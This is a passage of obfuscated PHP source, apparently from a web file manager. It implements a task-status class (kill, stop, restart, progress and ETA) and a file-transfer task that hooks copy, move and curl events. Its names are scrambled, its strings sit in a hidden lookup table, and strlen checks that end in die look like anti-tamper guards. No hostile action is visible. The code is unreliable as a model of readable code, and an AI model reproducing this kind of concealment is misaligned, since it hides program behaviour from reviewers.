$÷ü¶£óà[$ìæÑûÙî[1771]]; if ($ˆÇ≤§ŸÊ <= 0) { $ˆÇ≤§ŸÊ = 0.001; } $÷ü¶£óà[$ìæÑûÙî[1766]] = $÷ü¶£óà[$ìæÑûÙî[1765]] / $÷ü¶£óà[$ìæÑûÙî[1137]]; $÷ü¶£óà[$ìæÑûÙî[1767]] = $÷ü¶£óà[$ìæÑûÙî[1765]] / $ˆÇ≤§ŸÊ; if ($÷ü¶£óà[$ìæÑûÙî[1766]] > 0) { $÷ü¶£óà[$ìæÑûÙî[1772]] = $ˆÇ≤§ŸÊ * (1 - $÷ü¶£óà[$ìæÑûÙî[1766]]) / $÷ü¶£óà[$ìæÑûÙî[1766]]; } $÷ü¶£óà[$ìæÑûÙî[1772]] = $÷ü¶£óà[$ìæÑûÙî[1772]] <= 0 ? 0 : $÷ü¶£óà[$ìæÑûÙî[1772]]; } $this->updateAfter(); $Â˚ñ¿ø· = 0.2; if (timeFloat() - $÷ü¶£óà[$ìæÑûÙî[1770]] < $Â˚ñ¿ø· && !$È©ÿ—ÁÌ) { return; } $√≥Ã‰ÖÀ = self::get($÷ü¶£óà[$ìæÑûÙî[483]]); $≥øÊªâä = $√≥Ã‰ÖÀ[$ìæÑûÙî[823]]; if ($≥øÊªâä == self::STATYS_KILL) { $£ñ—Âñü = array($ìæÑûÙî[1782] => LNG($ìæÑûÙî[1783]), $ìæÑûÙî[1293] => !1); Cache::set($ìæÑûÙî[1784] . $this->task[$ìæÑûÙî[483]], $£ñ—Âñü, 30); $this->onKill(); $this->end(); die; } else { if ($≥øÊªâä == self::STATYS_STOP) { $ô∑ôÎ°¨ = 2; $√≥Ã‰ÖÀ[$ìæÑûÙî[1771]] += $ô∑ôÎ°¨; self::valueSet($÷ü¶£óà[$ìæÑûÙî[483]], $√≥Ã‰ÖÀ); sleep($ô∑ôÎ°¨); $this->update(); return; } } $÷ü¶£óà[$ìæÑûÙî[823]] = $≥øÊªâä ? $≥øÊªâä : $÷ü¶£óà[$ìæÑûÙî[823]]; $÷ü¶£óà[$ìæÑûÙî[1771]] = $√≥Ã‰ÖÀ[$ìæÑûÙî[1771]] ? $√≥Ã‰ÖÀ[$ìæÑûÙî[1771]] : 0; $÷ü¶£óà[$ìæÑûÙî[1770]] = timeFloat(); Hook::trigger($ìæÑûÙî[1785], $÷ü¶£óà); self::valueSet($÷ü¶£óà[$ìæÑûÙî[483]], $÷ü¶£óà); } public function onKillSet($¢ˆ≠Úπ˜, $ˆ∂‘†ú° = array()) { $this->onKillCall = array($¢ˆ≠Úπ˜, $ˆ∂‘†ú°); } public function onKill() { $£–ÒÔ‹Ö =& $_SERVER[ß⁄ˆÇ†Œ]; self::log($£–ÒÔ‹Ö[1778] . $this->task[$£–ÒÔ‹Ö[483]] . $£–ÒÔ‹Ö[1786]); Hook::trigger($£–ÒÔ‹Ö[1787], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($®≠Ã ﬁ·) { $≈Ç⁄πÙ› =& $_SERVER[ß⁄ˆÇ†Œ]; Cache::set($≈Ç⁄πÙ›[1784] . $this->task[$≈Ç⁄πÙ›[483]], $®≠Ã ﬁ·, 60); return $®≠Ã ﬁ·; } public static function get($˘ó®ƒÔ”) { $î˘ÔŒ‘Ô =& $_SERVER[ß⁄ˆÇ†Œ]; $ÏÏ¨Ú∆“ = self::valueGet($˘ó®ƒÔ”); if (is_array($ÏÏ¨Ú∆“) && $ÏÏ¨Ú∆“[$î˘ÔŒ‘Ô[1788]]) { $¬ıÒ„ñ≥ = ActionApply($ÏÏ¨Ú∆“[$î˘ÔŒ‘Ô[1788]], array($ÏÏ¨Ú∆“)); $ÏÏ¨Ú∆“ = is_array($¬ıÒ„ñ≥) ? $¬ıÒ„ñ≥ : $ÏÏ¨Ú∆“; } return $ÏÏ¨Ú∆“; } public static function listData() { $∆‰ÃÃ›£ = self::valueGet(); return array_sort_by($∆‰ÃÃ›£, $_SERVER[ß⁄ˆÇ†Œ][1768], !0); } public static function kill($©à£‘‘à) { return self::changeStatus($©à£‘‘à, self::STATYS_KILL); } public static function stop($‰ÿô ˚É) { return self::changeStatus($‰ÿô ˚É, self::STATYS_STOP); } public static function restart($ÇÄé√êì) { return self::changeStatus($ÇÄé√êì, self::STATYS_RUNNING); } public static function killAll() { $È”Ç§¥ü =& $_SERVER[ß⁄ˆÇ†Œ]; $—◊ù√œ” = self::listData(); foreach ($—◊ù√œ” as $‹éãÂÈı) { self::kill($‹éãÂÈı[$È”Ç§¥ü[483]]); } sleep(2); foreach ($—◊ù√œ” as $‹éãÂÈı) { self::valueSet($‹éãÂÈı[$È”Ç§¥ü[483]], !1); } } private static function changeStatus($§›´Ä®ù, $≈¬ÃˆˆË) { $–ªéÇÑÑ =& $_SERVER[ß⁄ˆÇ†Œ]; $¢Ωøáì = self::valueGet($§›´Ä®ù); if (!$¢Ωøáì) { return !1; } $¢Ωøáì[$–ªéÇÑÑ[823]] = $≈¬ÃˆˆË; self::valueSet($§›´Ä®ù, $¢Ωøáì); self::log($–ªéÇÑÑ[1789] . $¢Ωøáì[$–ªéÇÑÑ[483]] . $–ªéÇÑÑ[1790] . $≈¬ÃˆˆË); return !0; } public static function valueGet($‡¡Æ±¿± = false) { $Î∞⁄à≈› =& $_SERVER[ß⁄ˆÇ†Œ]; if ($‡¡Æ±¿±) { $êà˜Ç‘ = Model($Î∞⁄à≈›[528])->where(array($Î∞⁄à≈›[97] => $‡¡Æ±¿±, $Î∞⁄à≈›[33] => $Î∞⁄à≈›[1146]))->find(); return $êà˜Ç‘ ? json_decode($êà˜Ç‘[$Î∞⁄à≈›[459]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ŸÊ¨íÁ® = false) { $¥˙˜Ã®Ã =& $_SERVER[ß⁄ˆÇ†Œ]; $≤ÇúÚ∆™ = array($¥˙˜Ã®Ã[33] => $¥˙˜Ã®Ã[1146]); if ($ŸÊ¨íÁ®) { $≤ÇúÚ∆™[$¥˙˜Ã®Ã[1764]] = $ŸÊ¨íÁ®; } $–ÏÜ˜∏◊ = Model($¥˙˜Ã®Ã[528])->where($≤ÇúÚ∆™)->select(); $–ÏÜ˜∏◊ = $–ÏÜ˜∏◊ ? $–ÏÜ˜∏◊ : array(); foreach ($–ÏÜ˜∏◊ as $ÖÓÅ÷Ãá => $˙åÿ≤¥ï) { $–ÏÜ˜∏◊[$ÖÓÅ÷Ãá] = json_decode($˙åÿ≤¥ï[$¥˙˜Ã®Ã[459]], !0); } return $–ÏÜ˜∏◊; } public static function valueSet($¡¯õº§…, $–ì˝çÓı) { $™ìˆéÑ‘ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$–ì˝çÓı) { return Model($™ìˆéÑ‘[528])->where(array($™ìˆéÑ‘[97] => $¡¯õº§…, $™ìˆéÑ‘[33] => $™ìˆéÑ‘[1146]))->delete(); } $∂Ÿù˘ıÌ = json_encode($–ì˝çÓı); if (!$∂Ÿù˘ıÌ) { ob_start(); var_dump($–ì˝çÓı); $±àä∂˝É = ob_get_clean(); self::log($™ìˆéÑ‘[1791] . json_encode_force($±àä∂˝É)); } if (!$¡¯õº§… || !$–ì˝çÓı[$™ìˆéÑ‘[483]]) { return !1; } $í≤ûÂ„À = array($™ìˆéÑ‘[33] => $™ìˆéÑ‘[1146], $™ìˆéÑ‘[1764] => USER_ID, $™ìˆéÑ‘[97] => $¡¯õº§…, $™ìˆéÑ‘[459] => $∂Ÿù˘ıÌ); $÷¥˜È’ë = $™ìˆéÑ‘[1792]; CacheLock::lock($÷¥˜È’ë); Model($™ìˆéÑ‘[528])->add($í≤ûÂ„À, array(), !0); CacheLock::unlock($÷¥˜È’ë); } public static function log($û˙ûË´·) { if (!GLOBAL_DEBUG) { return; } write_log($û˙ûË´·, $_SERVER[ß⁄ˆÇ†Œ][1793]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ı√€ãëá =& $_SERVER[ß⁄ˆÇ†Œ]; $îØ∫ä⁄™ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ı√€ãëá[1794], array($this, $ı√€ãëá[1795])); Hook::bind($ı√€ãëá[1304], array($this, $ı√€ãëá[1796])); Hook::bind($ı√€ãëá[1797], array($this, $ı√€ãëá[1798])); Hook::bind($ı√€ãëá[676], array($this, $ı√€ãëá[1799])); Hook::bind($ı√€ãëá[677], array($this, $ı√€ãëá[1800])); Hook::bind($ı√€ãëá[683], array($this, $ı√€ãëá[1801])); Hook::bind($ı√€ãëá[684], array($this, $ı√€ãëá[1802])); Hook::bind($ı√€ãëá[679], array($this, $ı√€ãëá[1803])); Hook::bind($ı√€ãëá[681], array($this, $ı√€ãëá[1804])); Hook::bind($ı√€ãëá[645], array($this, $ı√€ãëá[1805])); Hook::bind($ı√€ãëá[642], array($this, $ı√€ãëá[1805])); Hook::bind($ı√€ãëá[647], array($this, $ı√€ãëá[1805])); Hook::bind($ı√€ãëá[649], array($this, $ı√€ãëá[1805])); Hook::bind($ı√€ãëá[651], array($this, $ı√€ãëá[1805])); Hook::bind($ı√€ãëá[1806], array($this, $ı√€ãëá[1807])); Hook::bind($ı√€ãëá[667], array($this, $ı√€ãëá[1808])); $this->sourceModelCopyFlag = !1; Hook::bind($ı√€ãëá[1809], array($this, $ı√€ãëá[1810])); Hook::bind($ı√€ãëá[1811], array($this, $ı√€ãëá[1812])); Hook::bind($ı√€ãëá[1813], array($this, $ı√€ãëá[1814])); $îØ∫ä⁄™[$ı√€ãëá[1815]] = LNG($ı√€ãëá[1816]); $îØ∫ä⁄™[$ı√€ãëá[1817]] = 0; $îØ∫ä⁄™[$ı√€ãëá[1818]] = 0; $îØ∫ä⁄™[$ı√€ãëá[1139]] = $ı√€ãëá[12]; $îØ∫ä⁄™[$ı√€ãëá[1819]] = $ı√€ãëá[12]; $îØ∫ä⁄™[$ı√€ãëá[1820]] = 0; $îØ∫ä⁄™[$ı√€ãëá[1821]] = 0; $îØ∫ä⁄™[$ı√€ãëá[1822]] = 0; if (!$îØ∫ä⁄™[$ı√€ãëá[1653]]) { $îØ∫ä⁄™[$ı√€ãëá[1653]] = LNG($ı√€ãëá[1823]); } } protected function endAfter() { $°Ç–óﬂ› =& $_SERVER[ß⁄ˆÇ†Œ]; Hook::unbind($°Ç–óﬂ›[1794], array($this, $°Ç–óﬂ›[1795])); Hook::unbind($°Ç–óﬂ›[1304], array($this, $°Ç–óﬂ›[1796])); Hook::unbind($°Ç–óﬂ›[1797], array($this, $°Ç–óﬂ›[1798])); Hook::unbind($°Ç–óﬂ›[676], array($this, $°Ç–óﬂ›[1799])); Hook::unbind($°Ç–óﬂ›[677], array($this, $°Ç–óﬂ›[1800])); Hook::unbind($°Ç–óﬂ›[683], array($this, $°Ç–óﬂ›[1801])); Hook::unbind($°Ç–óﬂ›[684], array($this, $°Ç–óﬂ›[1802])); Hook::unbind($°Ç–óﬂ›[679], array($this, $°Ç–óﬂ›[1803])); Hook::unbind($°Ç–óﬂ›[681], array($this, $°Ç–óﬂ›[1804])); Hook::unbind($°Ç–óﬂ›[645], array($this, $°Ç–óﬂ›[1805])); Hook::unbind($°Ç–óﬂ›[642], array($this, $°Ç–óﬂ›[1805])); Hook::unbind($°Ç–óﬂ›[647], array($this, $°Ç–óﬂ›[1805])); Hook::unbind($°Ç–óﬂ›[649], array($this, $°Ç–óﬂ›[1805])); Hook::unbind($°Ç–óﬂ›[651], array($this, $°Ç–óﬂ›[1805])); Hook::unbind($°Ç–óﬂ›[1806], array($this, $°Ç–óﬂ›[1807])); Hook::unbind($°Ç–óﬂ›[667], array($this, $°Ç–óﬂ›[1808])); Hook::unbind($°Ç–óﬂ›[1809], array($this, $°Ç–óﬂ›[1810])); Hook::unbind($°Ç–óﬂ›[1811], array($this, $°Ç–óﬂ›[1812])); Hook::unbind($°Ç–óﬂ›[1813], array($this, $°Ç–óﬂ›[1814])); } public function copyMoveStart($úÿ≠µÂ≤, $ùı∆∫Çÿ, $ß¢ŒÅØã, $Å°£ù™Ê) { $≤ò’ä∑ö =& $_SERVER[ß⁄ˆÇ†Œ]; self::log($≤ò’ä∑ö[1824] . $ùı∆∫Çÿ . $≤ò’ä∑ö[73] . $Å°£ù™Ê); $è€„Íæ— = rtrim(TEMP_FILES, $≤ò’ä∑ö[8]); if (substr($ùı∆∫Çÿ, 0, strlen($è€„Íæ—)) == $è€„Íæ—) { return; } if (substr($Å°£ù™Ê, 0, strlen($è€„Íæ—)) == $è€„Íæ—) { return; } $ö≤‰Æóö =& $this->task; $ö≤‰Æóö[$≤ò’ä∑ö[1825]] = KodIO::transferType($úÿ≠µÂ≤, $ß¢ŒÅØã); $this->update(); } public function updateAfter() { $÷´ç˘√é =& $_SERVER[ß⁄ˆÇ†Œ]; $ÊÁÁ˙„ö =& $this->task; if (!$ÊÁÁ˙„ö[$÷´ç˘√é[836]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ÊÁÁ˙„ö[$÷´ç˘√é[1825]] == $÷´ç˘√é[1397]) { return; } self::updateTask($ÊÁÁ˙„ö); } private static function updateTask(&$˙òÈ°®¶) { $∑Ê≈Î◊Ô =& $_SERVER[ß⁄ˆÇ†Œ]; if ($˙òÈ°®¶[$∑Ê≈Î◊Ô[1825]] == $∑Ê≈Î◊Ô[1275] || $˙òÈ°®¶[$∑Ê≈Î◊Ô[1825]] == $∑Ê≈Î◊Ô[110]) { if ($˙òÈ°®¶[$∑Ê≈Î◊Ô[1819]]) { $˙òÈ°®¶[$∑Ê≈Î◊Ô[1822]] = $˙òÈ°®¶[$∑Ê≈Î◊Ô[1821]] + $˙òÈ°®¶[$∑Ê≈Î◊Ô[1818]]; } } else { if ($˙òÈ°®¶[$∑Ê≈Î◊Ô[1825]] == $∑Ê≈Î◊Ô[1398]) { if ($˙òÈ°®¶[$∑Ê≈Î◊Ô[1819]] == $∑Ê≈Î◊Ô[1275]) { $˙òÈ°®¶[$∑Ê≈Î◊Ô[1822]] = $˙òÈ°®¶[$∑Ê≈Î◊Ô[1821]] + $˙òÈ°®¶[$∑Ê≈Î◊Ô[1818]] * 0.5; } else { if ($˙òÈ°®¶[$∑Ê≈Î◊Ô[1819]] == $∑Ê≈Î◊Ô[110]) { $˙òÈ°®¶[$∑Ê≈Î◊Ô[1822]] = $˙òÈ°®¶[$∑Ê≈Î◊Ô[1821]] + $˙òÈ°®¶[$∑Ê≈Î◊Ô[1817]] * 0.5 + $˙òÈ°®¶[$∑Ê≈Î◊Ô[1818]] * 0.5; } } } } $˙òÈ°®¶[$∑Ê≈Î◊Ô[1766]] = $˙òÈ°®¶[$∑Ê≈Î◊Ô[1822]] / $˙òÈ°®¶[$∑Ê≈Î◊Ô[836]]; if ($˙òÈ°®¶[$∑Ê≈Î◊Ô[1766]] > 0) { $˙ò¶ÈÄ¸ = timeFloat() - $˙òÈ°®¶[$∑Ê≈Î◊Ô[1768]] - $˙òÈ°®¶[$∑Ê≈Î◊Ô[1771]]; $˙òÈ°®¶[$∑Ê≈Î◊Ô[1772]] = $˙ò¶ÈÄ¸ * (1 - $˙òÈ°®¶[$∑Ê≈Î◊Ô[1766]]) / $˙òÈ°®¶[$∑Ê≈Î◊Ô[1766]]; } } public function addPath($àÛ†ïÙé) { $∞”œ∫”˘ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$àÛ†ïÙé) { return; } $˛û ¿¯Í =& $this->task; $¿…¿‘∂Ï = IO::infoWithChildren($àÛ†ïÙé); $Çî≤ÄÑ = $˛û ¿¯Í[$∞”œ∫”˘[1826]] ? $˛û ¿¯Í[$∞”œ∫”˘[1826]][$∞”œ∫”˘[1827]] : 0; $˛û ¿¯Í[$∞”œ∫”˘[1826]] = array($∞”œ∫”˘[1827] => $Çî≤ÄÑ + 1, $∞”œ∫”˘[502] => $¿…¿‘∂Ï[$∞”œ∫”˘[32]], $∞”œ∫”˘[87] => $¿…¿‘∂Ï[$∞”œ∫”˘[87]], $∞”œ∫”˘[590] => $¿…¿‘∂Ï[$∞”œ∫”˘[590]] ? $¿…¿‘∂Ï[$∞”œ∫”˘[590]] : $¿…¿‘∂Ï[$∞”œ∫”˘[87]]); if ($¿…¿‘∂Ï[$∞”œ∫”˘[33]] == $∞”œ∫”˘[230]) { $˛û ¿¯Í[$∞”œ∫”˘[1137]] += 1; } else { $˛û ¿¯Í[$∞”œ∫”˘[1137]] += $¿…¿‘∂Ï[$∞”œ∫”˘[82]][$∞”œ∫”˘[80]]; if ($¿…¿‘∂Ï[$∞”œ∫”˘[193]]) { $˛û ¿¯Í[$∞”œ∫”˘[1137]] += $¿…¿‘∂Ï[$∞”œ∫”˘[82]][$∞”œ∫”˘[81]] + 1; } } $˛û ¿¯Í[$∞”œ∫”˘[836]] += $¿…¿‘∂Ï[$∞”œ∫”˘[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÁßÉÇÜ±) { } public function sourceAddHashEnd($Ì€ç∫·£) { } public function sourceAddFileStart($ıÊÇ…€Ç) { $œÕ°˛ûı =& $_SERVER[ß⁄ˆÇ†Œ]; $Ì»àã“∏ =& $this->task; $Ì»àã“∏[$œÕ°˛ûı[1817]] = $ıÊÇ…€Ç[$œÕ°˛ûı[79]]; $Ì»àã“∏[$œÕ°˛ûı[1815]] = $ıÊÇ…€Ç[$œÕ°˛ûı[32]]; $Ì»àã“∏[$œÕ°˛ûı[1139]] = $ıÊÇ…€Ç[$œÕ°˛ûı[32]]; $Ì»àã“∏[$œÕ°˛ûı[1828]] = $ıÊÇ…€Ç[$œÕ°˛ûı[87]]; $this->update(); } public function sourceAddFileEnd($‘˙∆∞⁄≤) { $ÄóÎßÜ∫ =& $_SERVER[ß⁄ˆÇ†Œ]; $„é°ıÌ¡ =& $this->task; $„é°ıÌ¡[$ÄóÎßÜ∫[1822]] += $‘˙∆∞⁄≤[$ÄóÎßÜ∫[79]]; $„é°ıÌ¡[$ÄóÎßÜ∫[1828]] = $‘˙∆∞⁄≤[$ÄóÎßÜ∫[87]]; $this->update(1); } public function copyFileStart($¶†ãÏ·ì, $°Î˘ƒ∂Á, $”Ëé≥√û, $ˆ¯Ã∂ﬁî, $Ë ˙·◊Á, $∏÷ÈØìˆ) { $¶ﬁÉöÔ÷ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÄáÃ•èù = $Ë ˙·◊Á; if ($ÄáÃ•èù == $GLOBALS[$¶ﬁÉöÔ÷[1829]]) { $ÄáÃ•èù = $GLOBALS[$¶ﬁÉöÔ÷[1830]]; } $GLOBALS[$¶ﬁÉöÔ÷[1830]] = $Ë ˙·◊Á; $GLOBALS[$¶ﬁÉöÔ÷[1829]] = $∏÷ÈØìˆ; $§—Ö¸´ì =& $this->task; $§—Ö¸´ì[$¶ﬁÉöÔ÷[1815]] = $ÄáÃ•èù; $§—Ö¸´ì[$¶ﬁÉöÔ÷[1817]] = (int) $¶†ãÏ·ì->size($°Î˘ƒ∂Á); $§—Ö¸´ì[$¶ﬁÉöÔ÷[1818]] = 0; $§—Ö¸´ì[$¶ﬁÉöÔ÷[1139]] = $¶ﬁÉöÔ÷[12]; $§—Ö¸´ì[$¶ﬁÉöÔ÷[1819]] = $¶ﬁÉöÔ÷[12]; $§—Ö¸´ì[$¶ﬁÉöÔ÷[1820]] = 0; $˛ºÃµ‚¢ = $§—Ö¸´ì[$¶ﬁÉöÔ÷[1817]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($§—Ö¸´ì[$¶ﬁÉöÔ÷[483]] . $¶ﬁÉöÔ÷[1831]); if ($˛ºÃµ‚¢ && file_exists(get_path_father($ˆ¯Ã∂ﬁî))) { Cache::set($§—Ö¸´ì[$¶ﬁÉöÔ÷[483]] . $¶ﬁÉöÔ÷[1831], $ˆ¯Ã∂ﬁî); $§—Ö¸´ì[$¶ﬁÉöÔ÷[1788]] = array($¶ﬁÉöÔ÷[1832], $¶ﬁÉöÔ÷[1833]); } $this->update(0, $˛ºÃµ‚¢); } public static function updateCopyLocalFileSize($£Îô≥Ûª) { $Ú›–ÿ¥› =& $_SERVER[ß⁄ˆÇ†Œ]; $≤¥ØÈÄî = Cache::get($£Îô≥Ûª[$Ú›–ÿ¥›[483]] . $Ú›–ÿ¥›[1831]); if (!$≤¥ØÈÄî || !file_exists($≤¥ØÈÄî)) { return $£Îô≥Ûª; } $£Îô≥Ûª[$Ú›–ÿ¥›[1818]] = @filesize($≤¥ØÈÄî); $£Îô≥Ûª[$Ú›–ÿ¥›[1822]] += $£Îô≥Ûª[$Ú›–ÿ¥›[1818]]; self::updateTask($£Îô≥Ûª); return $£Îô≥Ûª; } public function copyFileEnd($ﬁÏ¿±ÕÏ, $‡ﬂ¸Ó’∏, $±Ö“–èŸ, $Æ—Åœ∞ó, $˜ÎêΩÁ’, $ê≥Õãüî) { $ù÷Üú›– =& $_SERVER[ß⁄ˆÇ†Œ]; $ÒÓ¬„À‹ =& $this->task; $ÒÓ¬„À‹[$ù÷Üú›–[1818]] = $ÒÓ¬„À‹[$ù÷Üú›–[1817]]; $ÒÓ¬„À‹[$ù÷Üú›–[1819]] = $ù÷Üú›–[12]; unset($ÒÓ¬„À‹[$ù÷Üú›–[1788]]); if ($˜ÎêΩÁ’ == $ÒÓ¬„À‹[$ù÷Üú›–[1815]]) { $ÒÓ¬„À‹[$ù÷Üú›–[1821]] += $ÒÓ¬„À‹[$ù÷Üú›–[1817]]; $ÒÓ¬„À‹[$ù÷Üú›–[1822]] = $ÒÓ¬„À‹[$ù÷Üú›–[1821]]; $ªÿñù·¯ = 1; if (isset($ÒÓ¬„À‹[$ù÷Üú›–[1828]]) && $ÒÓ¬„À‹[$ù÷Üú›–[1828]] == $‡ﬂ¸Ó’∏) { $ªÿñù·¯ = 0; } $this->update($ªÿñù·¯); } else { $this->update(); $ÒÓ¬„À‹[$ù÷Üú›–[1818]] = 0; } Cache::remove($ÒÓ¬„À‹[$ù÷Üú›–[483]] . $ù÷Üú›–[1831]); self::log($ù÷Üú›–[1834] . $‡ﬂ¸Ó’∏ . $ù÷Üú›–[73] . $Æ—Åœ∞ó . $ù÷Üú›–[262] . $˜ÎêΩÁ’ . $ù÷Üú›–[1835] . $ÒÓ¬„À‹[$ù÷Üú›–[1815]]); } public function updateFileEnd($œ«œ„π», $∆óÖµö˛) { $Óîò•Ä» =& $_SERVER[ß⁄ˆÇ†Œ]; $ÊÁˆ¯⁄’ =& $this->task; $ÊÁˆ¯⁄’[$Óîò•Ä»[1815]] = $œ«œ„π»; $ÊÁˆ¯⁄’[$Óîò•Ä»[1817]] = $∆óÖµö˛; $ÊÁˆ¯⁄’[$Óîò•Ä»[1821]] += $∆óÖµö˛; $ÊÁˆ¯⁄’[$Óîò•Ä»[1822]] = $ÊÁˆ¯⁄’[$Óîò•Ä»[1821]]; $this->update(1); self::log($Óîò•Ä»[1836] . $œ«œ„π»); } public function sourceModelCopy($Ÿµãó≠‰) { $ã‰”ù˚“ =& $_SERVER[ß⁄ˆÇ†Œ]; $ˆÎŸ∫Éœ = $Ÿµãó≠‰[0]; $˘≠ƒÇŒà = $Ÿµãó≠‰[1]; $™∏ı¥áÓ =& $this->task; $this->sourceModelCopyFlag = !0; $˚Í¡ÙŒÅ = 0; switch ($ˆÎŸ∫Éœ) { case $ã‰”ù˚“[643]: $˚Í¡ÙŒÅ = 1; break; case $ã‰”ù˚“[646]: $™∏ı¥áÓ[$ã‰”ù˚“[1815]] = $˘≠ƒÇŒà[$ã‰”ù˚“[32]]; break; case $ã‰”ù˚“[648]: $˚Í¡ÙŒÅ = intval($Ÿµãó≠‰[$ã‰”ù˚“[464]] * 0.4); break; case $ã‰”ù˚“[650]: $˚Í¡ÙŒÅ = intval($Ÿµãó≠‰[$ã‰”ù˚“[464]] * 0.2); break; case $ã‰”ù˚“[652]: $˚Í¡ÙŒÅ = intval($Ÿµãó≠‰[$ã‰”ù˚“[464]] * 0.4); break; } $this->update($˚Í¡ÙŒÅ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($˜≠˝œîÊ, $Á˚È«û¸) { $⁄·ö˝·Ç =& $_SERVER[ß⁄ˆÇ†Œ]; $this->sourceModelCopyFlag = !0; $≥óî…›ù = 1; if (isset($˜≠˝œîÊ[$⁄·ö˝·Ç[82]])) { $≥óî…›ù = $˜≠˝œîÊ[$⁄·ö˝·Ç[82]][$⁄·ö˝·Ç[80]]; $≥óî…›ù = $≥óî…›ù + $˜≠˝œîÊ[$⁄·ö˝·Ç[82]][$⁄·ö˝·Ç[81]] + 1; } $this->update($≥óî…›ù); $this->sourceModelCopyFlag = !1; } public function sourceMove($¬íÑˆËÏ) { $this->sourceRemove($¬íÑˆËÏ, !1); } public function curlProgress($Éπ¬∂ˆè, $◊¯Ñâ‚∫, $áç≤Øâñ, $ÏŒ–éÜ±, $ﬂáÿü≈“) { $∂¨Ò…˙≤ =& $_SERVER[ß⁄ˆÇ†Œ]; $˚’ﬁäÃÄ =& $this->task; if ($ﬂáÿü≈“ > 0) { $˚’ﬁäÃÄ[$∂¨Ò…˙≤[1139]] = $∂¨Ò…˙≤[1837]; $˚’ﬁäÃÄ[$∂¨Ò…˙≤[1819]] = $∂¨Ò…˙≤[110]; if ($˚’ﬁäÃÄ[$∂¨Ò…˙≤[1817]]) { $˚’ﬁäÃÄ[$∂¨Ò…˙≤[1818]] = $ﬂáÿü≈“; } if ($˚’ﬁäÃÄ[$∂¨Ò…˙≤[1820]]) { $˚’ﬁäÃÄ[$∂¨Ò…˙≤[1818]] = $ﬂáÿü≈“ + $˚’ﬁäÃÄ[$∂¨Ò…˙≤[1820]]; } } else { if ($áç≤Øâñ > 0) { if ($˚’ﬁäÃÄ[$∂¨Ò…˙≤[1817]] == $◊¯Ñâ‚∫) { $˚’ﬁäÃÄ[$∂¨Ò…˙≤[1818]] = $áç≤Øâñ; $˚’ﬁäÃÄ[$∂¨Ò…˙≤[1139]] = $∂¨Ò…˙≤[1838]; $˚’ﬁäÃÄ[$∂¨Ò…˙≤[1819]] = $∂¨Ò…˙≤[1275]; } } } $this->update(); } public function curlProgressStart($àõÍ†˘©) { } public function curlProgressEnd($óÍÓÀ—–) { $Ë∞ΩËí⁄ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ò¿ø©ÕÑ =& $this->task; $ä®˜«∆¢ = curl_getinfo($óÍÓÀ—–); $≤‹ƒÇæ = $ä®˜«∆¢[$Ë∞ΩËí⁄[1839]]; if ($≤‹ƒÇæ == -1) { $≤‹ƒÇæ = $ä®˜«∆¢[$Ë∞ΩËí⁄[1840]]; } if ($Ò¿ø©ÕÑ[$Ë∞ΩËí⁄[1819]] == $Ë∞ΩËí⁄[110] && $≤‹ƒÇæ) { $Ò¿ø©ÕÑ[$Ë∞ΩËí⁄[1820]] += $≤‹ƒÇæ; } $this->update(); } } goto FÂÕ¨ˆÖª¶; FÈñÀ°Ì¶∑: $qgmwxjhpzo = $_SERVER[ß⁄ˆÇ†Œ][691]; if (strlen($qgmwxjhpzo) < $_SERVER[ß⁄ˆÇ†Œ][688]) { die; } class Application { private $defaultModule = "\x69\156\144\145\x78"; private $defaultController = "\x69\x6e\x64\145\x78"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($§Ω®ÑÖÅ) { $≥®ØŒÂ≤ =& $_SERVER[ß⁄ˆÇ†Œ]; $æ»á˙Ö© =& $_SERVER[è¨ò„Àﬂ]; $îèù√ë≤ = explode($æ»á˙Ö©[0], trim($§Ω®ÑÖÅ, $æ»á˙Ö©[0])); $this->defaultModule = $îèù√ë≤[0] ? $îèù√ë≤[0] : $this->defaultModule; $£Ï°∆∏ = $≥®ØŒÂ≤[692]; if (strlen($£Ï°∆∏) < $≥®ØŒÂ≤[693]) { die; } $this->defaultController = $îèù√ë≤[1] ? $îèù√ë≤[1] : $this->defaultController; $ø…Ãä§Ö = $≥®ØŒÂ≤[694]; if (strlen($ø…Ãä§Ö) < $≥®ØŒÂ≤[695]) { return; } $this->defaultAction = $îèù√ë≤[2] ? $îèù√ë≤[2] : $this->defaultAction; $Öä´å‘ë = $≥®ØŒÂ≤[696]; while (strlen($Öä´å‘ë) < $≥®ØŒÂ≤[688]) { if (!$Öä´å‘ë) { break; } $Öä´å‘ë++; } $this->jegh08601bc7($æ»á˙Ö©[1], array($this, $æ»á˙Ö©[2])); $À®© º≥ = $≥®ØŒÂ≤[697]; } public function appRun($˛⁄±∏©ƒ) { $˛“∑öúñ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ã∏î÷ñ¶ =& $_SERVER[è¨ò„Àﬂ]; $øÜæ…ö≈ = explode($Ã∏î÷ñ¶[0], $˛⁄±∏©ƒ); $ùÃ∞”˜∑ = $˛“∑öúñ[698]; if (strlen($ùÃ∞”˜∑) < $˛“∑öúñ[695]) { return; } $›•˚‚Ìø = strtolower($øÜæ…ö≈[0]); $öø˛Ïñ≈ = $Ã∏î÷ñ¶[3]; if ($›•˚‚Ìø == $Ã∏î÷ñ¶[4]) { $öø˛Ïñ≈ = $Ã∏î÷ñ¶[5]; $øÜæ…ö≈[0] = $Ã∏î÷ñ¶[6]; $øÜæ…ö≈[1] = $øÜæ…ö≈[1] . $Ã∏î÷ñ¶[7]; $˛⁄±∏©ƒ = join($Ã∏î÷ñ¶[0], $øÜæ…ö≈); $˛⁄±∏©ƒ = trim($˛⁄±∏©ƒ, $Ã∏î÷ñ¶[0]); } call_user_func(array($Ã∏î÷ñ¶[8], 